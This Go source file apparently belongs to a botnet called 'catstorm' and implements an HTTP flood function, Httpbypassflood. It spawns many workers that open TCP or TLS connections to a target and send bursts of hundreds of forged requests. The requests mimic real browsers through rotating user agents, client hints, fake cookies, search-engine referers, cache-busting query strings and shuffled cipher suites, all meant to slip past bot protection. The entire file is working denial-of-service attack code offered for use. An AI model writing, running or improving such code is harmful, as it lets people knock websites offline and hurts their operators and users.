package l7

import (
	"catstorm/Bot/Methods"
	"context"
	"crypto/tls"
	"net"
	"net/url"
	"strings"
	"time"
)

type browserProfile struct {
	userAgent       string
	accept          string
	acceptEnc       string
	secChUA         string
	secChUAPlatform string
	secChUAMobile   string
	priority        string
}

var browserProfiles = []browserProfile{
	{`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, `"Windows"`, `?0`, `u=0, i`},
	{`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, `"macOS"`, `?0`, `u=0, i`},
	{`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, `"Linux"`, `?0`, `u=0, i`},
	{`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Firefox";v="121", "Gecko";v="121"`, `"Windows"`, `?0`, `u=0`},
	{`Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Firefox";v="121", "Gecko";v="121"`, `"macOS"`, `?0`, `u=0`},
	{`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Safari";v="17.2", "WebKit";v="605.1"`, `"macOS"`, `?0`, ``},
	{`Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Safari";v="17.2", "WebKit";v="605.1"`, `"iOS"`, `?1`, ``},
	{`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Not_A Brand";v="8", "Chromium";v="119", "Microsoft Edge";v="119"`, `"Windows"`, `?0`, `u=0, i`},
	{`Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`,
		`gzip, deflate, br`,
		`"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, `"Android"`, `?1`, `u=0, i`},
	{`Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0`,
		`text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
		`gzip, deflate`,
		`"Firefox";v="121", "Gecko";v="121"`, `"Android"`, `?1`, `u=0`},
}

var hexChars = "0123456789abcdef"

func fmtHex(dst []byte, v uint64, n int) {
	for i := n - 1; i >= 0; i-- {
		dst[i] = hexChars[v&0xf]
		v >>= 4
	}
}

func fmtDec(dst []byte, v int) int {
	i := len(dst) - 1
	for v >= 10 {
		dst[i] = byte('0' + v%10)
		v /= 10
		i--
	}
	dst[i] = byte('0' + v)
	return i
}

var secFetchSites = [4]string{"same-origin", "same-site", "cross-site", "none"}
var secFetchModes = [4]string{"navigate", "same-origin", "no-cors", "cors"}
var secFetchDests = [6]string{"document", "iframe", "empty", "script", "style", "image"}
var cacheDirs = [8]string{
	"no-cache", "no-cache, no-store",
	"no-cache, must-revalidate", "max-age=0",
	"no-cache, no-store, must-revalidate",
	"private", "private, max-age=0", "no-transform",
}
var connTypes = [4]string{"keep-alive", "keep-alive", "keep-alive", "close"}
var httpMethods = [5]string{"GET", "GET", "GET", "POST", "HEAD"}
var cookieNames = []string{
	"session", "token", "auth", "sid", "track", "_ga", "_gid", "xsrf",
	"connect.sid", "PHPSESSID", "JSESSIONID", "csrftoken", "remember_me",
	"lang", "theme", "consent", "__cf_bm", "__stripe_mid", "AMP_TOKEN", "_fbp",
}
var referers = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://search.yahoo.com/search?p=",
	"https://duckduckgo.com/?q=",
	"https://www.google.com/",
	"https://t.co/",
	"https://l.facebook.com/l.php?u=",
}

var hxCipherSuites = []uint16{
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
}

func Httpbypassflood(ctx context.Context, raw string, sec int) {
	u, er := url.Parse(raw)
	if er != nil {
		return
	}

	isTLS := u.Scheme == "https"
	tgtPort := u.Port()
	if tgtPort == "" {
		tgtPort = "80"
		if isTLS {
			tgtPort = "443"
		}
	}

	path := u.Path
	if path == "" {
		path = "/"
	}

	n := methods.Workers()

	var hex16 [16]byte
	var hex12 [12]byte
	var hex8 [8]byte
	var dec16 [16]byte

	for i := 0; i < n; i++ {
		go func() {
			rng := methods.NewXorShift64()
			var sb strings.Builder
			sb.Grow(512)
			bodyBuf := make([]byte, 512)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, er := net.DialTimeout("tcp", net.JoinHostPort(u.Hostname(), tgtPort), 10*time.Second)
				if er != nil {
					time.Sleep(5 * time.Millisecond)
					continue
				}

				var writeConn net.Conn = conn
				if isTLS {
					idx := int(rng.Uint64() % uint64(len(hxCipherSuites)))
					shuffled := make([]uint16, len(hxCipherSuites))
					copy(shuffled, hxCipherSuites)
					shuffled[0], shuffled[idx] = shuffled[idx], shuffled[0]

					tlsConfig := &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Hostname(),
						CipherSuites:       shuffled,
						MinVersion:         tls.VersionTLS12,
					}

					tlsConn := tls.Client(conn, tlsConfig)
					if er := tlsConn.Handshake(); er != nil {
						conn.Close()
						continue
					}
					writeConn = tlsConn
				}

				bursts := 80 + int(rng.Uint64()%320)
				for j := 0; j < bursts; j++ {
					sb.Reset()
					r := rng.Uint64()

					method := httpMethods[r%5]
					p := path
					if (r>>3)&1 == 0 {
						r2 := rng.Uint64()
						fmtHex(hex8[:], r2, 8)
						p += "?" + string(hex8[:4]) + "=" + string(hex8[4:])
					}

					profile := browserProfiles[r%uint64(len(browserProfiles))]

					sb.WriteString(method)
					sb.WriteByte(' ')
					sb.WriteString(p)
					sb.WriteString(" HTTP/1.1\r\nHost: ")
					sb.WriteString(u.Host)
					sb.WriteString("\r\nUser-Agent: ")
					sb.WriteString(profile.userAgent)
					sb.WriteString("\r\n")

					if profile.secChUA != "" && (r>>6)&1 == 0 {
						sb.WriteString("Sec-Ch-Ua: ")
						sb.WriteString(profile.secChUA)
						sb.WriteString("\r\n")
					}
					if profile.secChUAPlatform != "" && (r>>9)&1 == 0 {
						sb.WriteString("Sec-Ch-Ua-Platform: ")
						sb.WriteString(profile.secChUAPlatform)
						sb.WriteString("\r\n")
						sb.WriteString("Sec-Ch-Ua-Mobile: ")
						sb.WriteString(profile.secChUAMobile)
						sb.WriteString("\r\n")
					}

					sb.WriteString("Accept: ")
					sb.WriteString(profile.accept)
					sb.WriteString("\r\nAccept-Encoding: ")
					sb.WriteString(profile.acceptEnc)
					sb.WriteString("\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: ")
					sb.WriteString(cacheDirs[r%8])
					sb.WriteString("\r\n")

					if (r>>12)&1 == 0 {
						sb.WriteString("Connection: ")
						sb.WriteString(connTypes[r%4])
						sb.WriteString("\r\n")
					}
					if (r>>14)&1 == 0 {
						sb.WriteString("Upgrade-Insecure-Requests: 1\r\n")
					}
					if (r>>16)&3 == 0 {
						sb.WriteString("DNT: 1\r\n")
					}

					sb.WriteString("Sec-Fetch-Site: ")
					sb.WriteString(secFetchSites[r%4])
					sb.WriteString("\r\nSec-Fetch-Mode: ")
					sb.WriteString(secFetchModes[(r>>2)%4])
					sb.WriteString("\r\nSec-Fetch-Dest: ")
					sb.WriteString(secFetchDests[(r>>4)%6])
					sb.WriteString("\r\n")

					if ((r>>18)&1) == 0 && ((r>>19)&1) == 0 {
						sb.WriteString("Sec-Fetch-User: ?1\r\n")
					}
					if profile.priority != "" && (r>>20)&1 == 0 {
						sb.WriteString("Priority: ")
						sb.WriteString(profile.priority)
						sb.WriteString("\r\n")
					}
					if (r>>22)&1 == 0 {
						ref := referers[r%uint64(len(referers))]
						r3 := rng.Uint64()
						fmtHex(hex12[:], r3, 12)
						sb.WriteString("Referer: ")
						sb.WriteString(ref)
						sb.Write(hex12[:12])
						sb.WriteString("\r\n")
					}
					if (r>>24)&3 == 0 {
						sb.WriteString("Cookie: ")
						nCookies := 1 + (r>>26)&3
						for k := uint64(0); k < nCookies; k++ {
							if k > 0 {
								sb.WriteString("; ")
							}
							c := rng.Uint64()
							sb.WriteString(cookieNames[c%uint64(len(cookieNames))])
							sb.WriteByte('=')
							fmtHex(hex16[:], rng.Uint64(), 16)
							sb.Write(hex16[:16])
						}
						sb.WriteString("\r\n")
					}

					if method == "POST" && (r>>28)&1 == 0 {
						blen := 32 + int(rng.Uint64()%256)
						rng.Fill(bodyBuf[:blen])
						clIdx := fmtDec(dec16[:], blen)
						sb.WriteString("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ")
						sb.Write(dec16[clIdx:])
						sb.WriteString("\r\nConnection: keep-alive\r\n\r\n")
						sb.Write(bodyBuf[:blen])
					} else {
						sb.WriteString("\r\n")
					}

					writeConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
					if _, er := writeConn.Write([]byte(sb.String())); er != nil {
						break
					}
				}

				if tcp, ok := writeConn.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				} else if tlsConn, ok := writeConn.(*tls.Conn); ok {
					if tcp, ok := tlsConn.NetConn().(*net.TCPConn); ok {
						tcp.SetLinger(0)
					}
				}
				writeConn.Close()
			}
		}()
	}
	<-ctx.Done()
}
